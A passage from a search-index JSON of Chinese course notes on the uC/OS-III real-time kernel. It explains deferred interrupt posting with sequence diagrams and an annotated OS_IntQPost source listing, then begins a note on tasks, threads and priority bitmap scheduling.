\u6982\u5ff5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#3","text":"","title":"3. \u56fe\u8868\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#31","text":"\u4e0d\u4f7f\u7528 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\uff0c\u4e2d\u65ad\u54cd\u5e94\u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8017\u65f6\u4efb\u52a1\u5728ISR\u4e2d\u6267\u884c\uff0c\u8fd9\u4f1a\u4f7f\u5f97\u7cfb\u7edf\u8fdb\u5165\u4e00\u6bb5\u5f88\u957f\u7684\u4e34\u754c\u6bb5\u3002 sequenceDiagram \u4efb\u52a11-->>+\u4efb\u52a11:\u5f00\u59cb\u8fd0\u884c \u4efb\u52a11->>+CPU: \u5916\u90e8\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42 CPU->>+RTOS: \u4fdd\u5b58\u4e2d\u65ad\u73b0\u573a RTOS->>+ISR:\u4e2d\u65ad\u9884\u5904\u7406 ISR-->>+\u8017\u65f6\u4efb\u52a1:\u6267\u884c\u8017\u65f6\u4efb\u52a1 \u8017\u65f6\u4efb\u52a1-->>-ISR:\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5 ISR-->>-RTOS: ISR\u6267\u884c\u5b8c\u6bd5 RTOS-->>-CPU: \u8fdb\u884c\u4e2d\u65ad\u9000\u51fa\u5904\u7406 CPU-->>-\u4efb\u52a11:\u6062\u590d\u73b0\u573a \u4efb\u52a11-->>-\u4efb\u52a11:\u7ee7\u7eed\u8fd0\u884c \\text{Figure 1. \u4e0d\u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\u7684\u4e2d\u65ad\u54cd\u5e94\u8fc7\u7a0b} RTOS \uff1a\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\uff08Real Time Operating System\uff09 ISR \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff08Interrupt Service Routine\uff09 \u8017\u65f6\u4efb\u52a1 \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u8f83\u4e3a\u8017\u65f6\u3001\u53ef\u5ef6\u8fdf\u5904\u7406\u7684\u90e8\u5206\u3002","title":"3.1. \u4e00\u822c\u60c5\u51b5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#32","text":"\u4f7f\u7528 \u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\uff0c\u4e2d\u65ad\u54cd\u5e94\u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8017\u65f6\u4efb\u52a1\u5728\u4e2d\u65ad\u7ed3\u675f\u4e4b\u540e\u5f00\u59cb\u6267\u884c\u3002\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\uff0c\u6240\u4ee5\u4e2d\u65ad\u5904\u7406\u7684\u5b9e\u65f6\u6027\u4e5f\u80fd\u591f\u5f97\u5230\u4fdd\u8bc1\u3002 sequenceDiagram \u4efb\u52a11-->>+\u4efb\u52a11:\u5f00\u59cb\u8fd0\u884c \u4efb\u52a11->>+CPU: \u5916\u90e8\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42 CPU->>+RTOS: \u4fdd\u5b58\u4e2d\u65ad\u73b0\u573a RTOS->>+ISR:\u4e2d\u65ad\u9884\u5904\u7406 ISR-->>+\u8017\u65f6\u4efb\u52a1:\u521b\u5efa\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570 \u8017\u65f6\u4efb\u52a1-->>-ISR:\u4efb\u52a1\u5ef6\u540e\u6267\u884c ISR-->>-RTOS: ISR\u6267\u884c\u5b8c\u6bd5 RTOS-->>-CPU: \u8fdb\u884c\u4e2d\u65ad\u9000\u51fa\u5904\u7406 CPU-->>-\u4efb\u52a11:\u6062\u590d\u73b0\u573a \u4efb\u52a11-->>+\u8017\u65f6\u4efb\u52a1:\u6267\u884c\u8017\u65f6\u4efb\u52a1 \u8017\u65f6\u4efb\u52a1-->>-\u4efb\u52a11:\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5 \u4efb\u52a11-->>-\u4efb\u52a11:\u7ee7\u7eed\u8fd0\u884c \\text{Figure 2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u65f6\u7684\u4e2d\u65ad\u54cd\u5e94\u8fc7\u7a0b}","title":"3.2. \u4f7f\u7528\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#4","text":"\u4ece\u4e0b\u9762\u7684\u6e90\u4ee3\u7801\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u51fd\u6570\u9700\u8981\u4f20\u5165\u4e00\u7ec4 \u5185\u6838\u5bf9\u8c61 \uff08\u7531\u5ef6\u8fdf\u63d0\u4ea4\u521d\u59cb\u5316\u51fd\u6570 OS_IntQTaskInit() \u751f\u6210\uff09\u3002\u5c06\u5b83\u4eec\u653e\u5165\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u540e\uff0c\u51fd\u6570\u5c06\u5c31\u7eea\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\uff0c\u63a5\u7740\u7ee7\u7eed\u6267\u884c\u4e2d\u65ad\u3002\u5728\u9000\u51fa\u6240\u4ee5\u4e2d\u65ad\u5d4c\u5957\u540e\uff0c\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u4efb\u52a1\u5c31\u662f\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\u3002 // os_int.c void OS_IntQPost (OS_OBJ_TYPE type, void *p_obj, void *p_void, OS_MSG_SIZE msg_size, OS_FLAGS flags, OS_OPT opt, CPU_TS ts, OS_ERR *p_err) { CPU_SR_ALLOC(); #if (OS_CFG_TS_EN == DEF_DISABLED) (void)ts; /* Prevent compiler warning for not using 'ts'*/ #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u68c0\u6d4b\u662f\u5426\u8d85\u8fc7\u4e86\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5185\u6838\u5bf9\u8c61\u7684\u6700\u5927\u6570\u91cf if (OSIntQNbrEntries < OSCfg_IntQSize) { /* Make sure we haven't already filled the ISR queue*/ // \u8bb0\u5f55\u5f53\u524d\u8981\u5ef6\u8fdf\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u6570\u76ee OSIntQNbrEntries++; // \u66f4\u65b0\u5ef6\u8fdf\u63d0\u4ea4\u5185\u6838\u5bf9\u8c61\u7684\u6700\u5927\u6570\u76ee if (OSIntQNbrEntriesMax < OSIntQNbrEntries) { OSIntQNbrEntriesMax = OSIntQNbrEntries; } // \u5c06\u8981\u91cd\u65b0\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u7684\u4fe1\u606f\uff0c\u653e\u5165\u961f\u5217\u5165\u53e3\u7684\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u8bb0\u5f55\u5757 OSIntQInPtr->Type = type; /* \u4fdd\u5b58\u5185\u6838\u5bf9\u8c61\u7684\u7c7b\u578b*/ OSIntQInPtr->ObjPtr = p_obj; /* \u4fdd\u5b58\u5185\u6838\u5bf9\u8c61\u53d8\u91cf\u6307\u9488*/ OSIntQInPtr->MsgPtr = p_void; /* \u4fdd\u5b58\u6d88\u606f\u7684\u6307\u9488\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u6d88\u606f\u6216\u8005\u4efb\u52a1\u6d88\u606f\uff09*/ OSIntQInPtr->MsgSize = msg_size; /* \u4fdd\u5b58\u6d88\u606f\u7684\u5927\u5c0f\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u6d88\u606f\u6216\u8005\u4efb\u52a1\u6d88\u606f\uff09*/ OSIntQInPtr->Flags = flags; /* \u4fdd\u5b58\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\uff08\u5982\u679c\u63d0\u4ea4\u7684\u662f\u4e8b\u4ef6\u6807\u5fd7\uff09*/ OSIntQInPtr->Opt = opt; /* \u4fdd\u5b58\u63d0\u4ea4\u65f6\u7684\u9009\u9879*/ #if (OS_CFG_TS_EN == DEF_ENABLED) OSIntQInPtr->TS = ts; /* \u4fdd\u5b58\u63d0\u4ea4\u65f6\u7684\u65f6\u95f4\u6233*/ #endif // \u66f4\u65b0\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u5165\u53e3\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u8bb0\u5f55\u5757 OSIntQInPtr = OSIntQInPtr->NextPtr; /* Point to the next interrupt handler queue entry*/ #if (OS_CFG_DBG_EN == DEF_ENABLED) // \u5c31\u7eea\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1 // 1. \u66f4\u65b0\u5c31\u7eea\u5217\u8868\u4e0a\u7684\u4efb\u52a1\u6570\u91cf\u4e3a1 OSRdyList[0].NbrEntries = 1u; /* Make the interrupt handler task ready to run*/ #endif // 2. \u5c31\u7eea\u5217\u8868\u7684\u5934\u6307\u9488\u548c\u5c3e\u6307\u9488\u90fd\u6307\u5411\u4efb\u52a1\u63a7\u5236\u5757\u6307\u9488 OSRdyList[0].HeadPtr = &OSIntQTaskTCB; OSRdyList[0].TailPtr = &OSIntQTaskTCB; // 3. \u5728\u4f18\u5148\u7ea7\u8868\u4e2d\u6dfb\u52a0\u4efb\u52a1\u4f18\u5148\u7ea70 OS_PrioInsert(0u); /* Add task priority 0 in the priority table*/ if (OSPrioCur != 0) { // \u8bb0\u5f55\u5c31\u7eea\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\u4e4b\u524d\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u65b9\u4fbf\u540e\u9762\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 /* Chk if OSIntQTask is not running*/ OSPrioSaved = OSPrioCur; /* Save current priority*/ } *p_err = OS_ERR_NONE; } else { // \u5982\u679c\u5df2\u7ecf\u8d85\u8fc7\u5ef6\u8fdf\u63d0\u4ea4\u4fe1\u606f\u961f\u5217\u7684\u957f\u5ea6\uff0c\u5c31\u5c06OSIntQOvfCtr\u52a01\uff0c\u4ee3\u8868\u56e0\u961f\u5217\u5df2\u6ee1\uff0c\u6ca1\u6709\u88ab\u91cd\u65b0\u63d0\u4ea4\u7684\u5185\u6838\u5bf9\u8c61\u4e2a\u6570 OSIntQOvfCtr++; /* Count the number of ISR queue overflows*/ *p_err = OS_ERR_INT_Q_FULL; } // \u9000\u51fa\u4e34\u754c\u6bb5 CPU_CRITICAL_EXIT(); } \u4ee3\u7801\u6ce8\u91ca\u53c2\u8003\u81eauCOS\u6ce8\u91ca\u548c \u300a\u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u3002 \u53e6\u5916\uff0c\u5728\u6d4f\u89c8\u6e90\u4ee3\u7801\u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u6ce8\u91ca\uff0c\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5df2\u7ecf\u4e0d\u88ab\u63a8\u8350\u4f7f\u7528\u4e86\u3002 This function is DEPRECATED and is not recommended for new designs. Deferred ISRs is a deprecated feature of the kernel. It remains fully functional and supported but should not be used for new applications. \u4e8e\u662f\u6211\u53bb\u5b98\u7f51\u6d4f\u89c8\u4e86\u4e00\u4e0b\u66f4\u65b0\u8bb0\u5f55\uff0c\u6211\u4f7f\u7528\u7684\u6e90\u7801\u7248\u672c\u662fV3.05.01\uff0c\u800c\u6211\u770b\u5230\u5728uC/OS-III v3.06.00\u53d1\u5e03\u7684 \u66f4\u65b0\u8bb0\u5f55 \u4e2d\uff0c\u5df2\u7ecf\u5c06\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u5217\u4e3a\u4e86\u8fc7\u65f6\u7684\u65b9\u6cd5\u5e76\u4e14\u53bb\u9664\u4e86\uff0c\u63a8\u6d4b\u53ef\u80fd\u662f\u51fa\u4e8e\u5b9e\u65f6\u6027\u548c\u7a33\u5b9a\u6027\u7684\u8003\u8651\u3002 Deferred interrupt processing is now obsolete and has been removed.","title":"4. \u6e90\u7801\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.uCos%E7%9A%84%E5%BB%B6%E8%BF%9F%E4%B8%AD%E6%96%AD%E6%8F%90%E4%BA%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87/#5","text":"[1] \u674e\u60a6\u57ce. \u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/","text":"uCos\u4e2d\u7684\u4efb\u52a1\u673a\u5236\u548c\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 # \u76ee\u5f55 # uCos\u4e2d\u7684\u4efb\u52a1\u673a\u5236\u548c\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u4efb\u52a1\u6982\u8ff0 2.1. \u8fdb\u7a0b\u4e0e\u7ebf\u7a0b 2.1.1. \u4ece\u8fdb\u7a0b\u5230\u7ebf\u7a0b 2.1.2. \u8fdb\u7a0b/\u7ebf\u7a0b\u6a21\u578b 3. \u4efb\u52a1\u6982\u8ff0 3.1. \u4efb\u52a1\u5b9a\u4e49 3.2. \u4efb\u52a1\u7684\u4f18\u52bf 3.3. \u4efb\u52a1\u7684\u5206\u7c7b 4. \u4efb\u52a1\u53c2\u6570 5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1 6. \u4efb\u52a1\u63a7\u5236\u5757 7. \u5c31\u7eea\u7b97\u6cd5 7.1. \u5c31\u7eea\u8868 7.2. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 7.2.1. \u4f18\u5148\u7ea7\u4f4d\u56fe 7.2.2. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 7.2.3. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001 7.2.4. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868 7.2.5. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7 8. \u4efb\u52a1\u8c03\u5ea6 8.1. \u6982\u8ff0 8.2. \u4efb\u52a1\u5207\u6362 8.3. \u4efb\u52a1\u5207\u6362\u7684\u57fa\u672c\u6b65\u9aa4 8.4. \u4efb\u52a1\u5207\u6362\u7684\u65f6\u673a 9. \u4efb\u52a1\u7ba1\u7406\u673a\u5236 9.1. \u4e3b\u8981\u4efb\u52a1\u7ba1\u7406\u529f\u80fd 9.2. \u521b\u5efa\u4efb\u52a1 9.3. \u5806\u6808\u7a7a\u95f4 9.4. \u5220\u9664\u4efb\u52a1 9.5. \u6302\u8d77\u4efb\u52a1 9.6. \u89e3\u6302\u4efb\u52a1 9.7. \u4e00\u4e9b\u7279\u6b8a\u7684\u7cfb\u7edf\u4efb\u52a1 10. \u6e90\u7801\u5206\u6790 10.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 10.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 10.3. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 10.4. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570 11. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4efb\u52a1\u673a\u5236\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002 2. \u4efb\u52a1\u6982\u8ff0 # 2.1. \u8fdb\u7a0b\u4e0e\u7ebf\u7a0b # 2.1.1. \u4ece\u8fdb\u7a0b\u5230\u7ebf\u7a0b # \u5b9a\u4e49 \uff1a\u8fdb\u7a0b\u6700\u521d\u7531Multics\u7684\u8bbe\u8ba1\u8005\u572820\u4e16\u7eaa60\u5e74\u4ee3\u63d0\u51fa\u6765\u7684\uff0c\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a \u4e00\u4e2a\u6b63\u5728\u6267\u884c\u7684\u7a0b\u5e8f \u8ba1\u7b97\u673a\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u7a0b\u5e8f\u7684\u4e00\u4e2a\u5b9e\u4f8b \u53ef\u4ee5\u5206\u914d\u7ed9\u5904\u7406\u5668\uff0c\u5e76\u7531\u5904\u7406\u5668\u6267\u884c\u7684\u4e00\u4e2a\u5b9e\u4f53 \u7531\u4e00\u4e2a\u987a\u5e8f\u7684\u6267\u884c\u7ebf\u7a0b\u3001\u4e00\u4e2a\u5f53\u524d\u72b6\u6001\u548c\u4e00\u7ec4\u76f8\u5173\u7684\u7cfb\u7edf\u8d44\u6e90\u6240\u523b\u753b\u7684\u6d3b\u52a8\u5355\u5143 \u7ec4\u6210 \uff1a\u8fdb\u7a0b\u7531\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u6808\u548c\u8fdb\u7a0b\u63a7\u5236\u5757\u6784\u6210 \u8fdb\u7a0b\u63a7\u5236\u5757\u5305\u542b\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7528\u6765\u63a7\u5236\u8fdb\u7a0b\u6240\u9700\u8981\u7684\u4fe1\u606f \u5305\u62ec\u8fdb\u7a0b\u72b6\u6001\u548c\u8c03\u5ea6\u4fe1\u606f\u3001CPU\u5bc4\u5b58\u5668\u4fe1\u606f\u3001\u5185\u5b58\u7ba1\u7406\u4fe1\u606f\u548cI/O\u72b6\u6001\u4fe1\u606f\u3002 \u4f5c\u7528 \uff1a\u65e9\u671f\u7684\u8fdb\u7a0b\uff0c\u5305\u542b\u4e86\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9 \u8d44\u6e90\u3002\u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u5305\u62ec\u4e00\u4e2a\u4fdd\u5b58\u8fdb\u7a0b\u6620\u50cf\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3001\u4e3b\u5b58\u3001I/O\u8bbe\u5907\u548c\u6587\u4ef6\u7b49\u8d44\u6e90\u3002 \u8c03\u5ea6\u6267\u884c\u3002\u8fdb\u7a0b\u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8c03\u5ea6\u5b9e\u4f53\uff0c\u662f\u8c03\u5ea6\u7684\u57fa\u672c\u5355\u4f4d\u3002 \u6f14\u53d8 \uff1a\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5c55\uff0c\u8fdb\u7a0b\u6240\u5305\u542b\u7684\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\u9010\u6e10\u88ab\u5206\u5f00\uff1a \u8f7b\u91cf\u7ea7\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff1a\u8c03\u5ea6\u6267\u884c\u7684\u5355\u4f4d \u8fdb\u7a0b\uff1a\u8d44\u6e90\u5206\u914d\u7684\u5355\u4f4d \u7ebf\u7a0b\u662f\u8fdb\u7a0b\u5185\u90e8\u4e00\u4e2a\u76f8\u5bf9\u72ec\u7acb\u7684\u63a7\u5236\u6d41\uff0c\u7531\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u548c\u9700\u8981\u6267\u884c\u7684\u4e00\u6bb5\u7a0b\u5e8f\u6307\u4ee4\u6784\u6210 \u5728\u8fdb\u7a0b\u4e2d\uff0c\u6240\u6709\u7ebf\u7a0b\u5171\u4eab\u8be5\u8fdb\u7a0b\u7684\u72b6\u6001\u548c\u8d44\u6e90\uff0c\u53ef\u4ee5\u8bbf\u95ee\u76f8\u540c\u7684\u6570\u636e \u7ebf\u7a0b\u7684\u4f18\u52bf \uff1a \u521b\u5efa \uff1a\u5728\u4e00\u4e2a\u5df2\u6709\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7ebf\u7a0b\u6bd4\u521b\u5efa\u4e00\u4e2a\u5168\u65b0\u7684\u8fdb\u7a0b\u6240\u9700\u7684\u65f6\u95f4\u5f00\u9500\u5c11 \u7ec8\u6b62 \uff1a\u7ec8\u6b62\u4e00\u4e2a\u7ebf\u7a0b\u6bd4\u7ec8\u6b62\u4e00\u4e2a\u8fdb\u7a0b\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u5c11 \u5207\u6362 \uff1a\u7ebf\u7a0b\u5207\u6362\u6bd4\u8fdb\u7a0b\u5207\u6362\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u5c11 \u901a\u4fe1 \uff1a\u4f7f\u540c\u4e00\u8fdb\u7a0b\u5185\u90e8\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u6548\u7387\u5f97\u5230\u663e\u8457\u63d0\u9ad8\u3002 \u5728\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u9700\u8981\u5185\u6838\u7684\u5e72\u9884\uff0c\u800c\u540c\u4e00\u8fdb\u7a0b\u5185\u90e8\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u5219\u53ef\u76f4\u63a5\u901a\u4fe1 2.1.2. \u8fdb\u7a0b/\u7ebf\u7a0b\u6a21\u578b # \u6a21\u578b \uff1a\u5f15\u5165\u7ebf\u7a0b\u7684\u6982\u5ff5\u540e\uff0c\u53ef\u628a\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u4f7f\u7528\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\u6a21\u578b: \\text{Figure 1. \u6a21\u578b} \u5355\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \uff1a\u5927\u591a\u6570\u5d4c\u5165\u5f0f\u5b9e\u65f6\u5185\u6838\u4f7f\u7528\u4e86\u5355\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b\uff0c\u6216\u7b80\u5355\u5730\u79f0\u4e3a \u4efb\u52a1\u6a21\u578b \u628a\u6574\u4e2a\u5e94\u7528\u5f53\u4f5c\u4e00\u4e2a\u6ca1\u6709\u5b9a\u4e49\u7684\u8fdb\u7a0b\u6765\u5bf9\u5f85 \u5e94\u7528\u5219\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u4efb\u52a1\u7684\u5f62\u5f0f\u6765\u8fdb\u884c\u5904\u7406 \u9002\u7528\u4e8e\u5b9e\u65f6\u6027\u8981\u6c42\u8f83\u9ad8\u7684\u3001\u76f8\u5bf9\u7b80\u5355\u7684\u5e94\u7528 \u591a\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \uff1a\u4e5f\u6709\u4e00\u4e9b\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u91c7\u7528\u4e86\u591a\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \u7cfb\u7edf\u4e2d\u5305\u542b\u591a\u4e2a\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5bf9\u5e94\u53c8\u5305\u542b\u591a\u4e2a\u7ebf\u7a0b \u9002\u5408\u4e8e\u5904\u7406\u590d\u6742\u7684\u5e94\u7528 3. \u4efb\u52a1\u6982\u8ff0 # 3.1. \u4efb\u52a1\u5b9a\u4e49 # \u5b9a\u4e49 \uff1a\u4efb\u52a1\u662f\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u57fa\u672c\u8c03\u5ea6\u5355\u4f4d\u3002 \u5185\u5bb9 \uff1a\u4efb\u52a1\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 \u4ee3\u7801 \uff1a\u4e00\u6bb5\u53ef\u6267\u884c\u7684\u7a0b\u5e8f \u6570\u636e \uff1a\u7a0b\u5e8f\u6240\u9700\u8981\u7684\u76f8\u5173\u6570\u636e\uff08\u53d8\u91cf\u3001\u5de5\u4f5c\u7a7a\u95f4\u3001\u7f13\u51b2\u533a\u7b49\uff09 \u5806\u6808 \uff1a\u5c40\u90e8\u53d8\u91cf\uff0c\u5b50\u7a0b\u5e8f\u8c03\u7528\uff0c\u4efb\u52a1\u4e0a\u4e0b\u6587\u7b49 \u4e0a\u4e0b\u6587 \uff1a\u7a0b\u5e8f\u6267\u884c\u7684\u4e0a\u4e0b\u6587\u73af\u5883 \u6ce8\uff1a\u4efb\u52a1\u901a\u5e38\u5305\u542b\u4e00\u4e2a\u5177\u6709\u65e0\u9650\u5faa\u73af\u7684\u7a0b\u5e8f 3.2. \u4efb\u52a1\u7684\u4f18\u52bf # \\text{Figure 2. \u4efb\u52a1\u7684\u4f18\u52bf} 3.3. \u4efb\u52a1\u7684\u5206\u7c7b # \\text{Figure 3. \u4efb\u52a1\u7684\u5206\u7c7b-\u6309\u5230\u8fbe\u60c5\u51b5\u7684\u53ef\u9884\u6d4b\u6027} \\text{Figure 4. \u4efb\u52a1\u7684\u5206\u7c7b-\u6309\u91cd\u8981\u7a0b\u5ea6\u5212\u5206} 4. \u4efb\u52a1\u53c2\u6570 # \u4f18\u5148\u7ea7 \u5b9a\u4e49 \uff1a\u8868\u793a\u4efb\u52a1\u5bf9\u5e94\u5de5\u4f5c\u5185\u5bb9\u5728\u5904\u7406\u4e0a\u7684\u4f18\u5148\u7a0b\u5ea6 \u4f5c\u7528 \uff1a\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8868\u660e\u4efb\u52a1\u8d8a\u9700\u8981\u5f97\u5230\u4f18\u5148\u5904\u7406 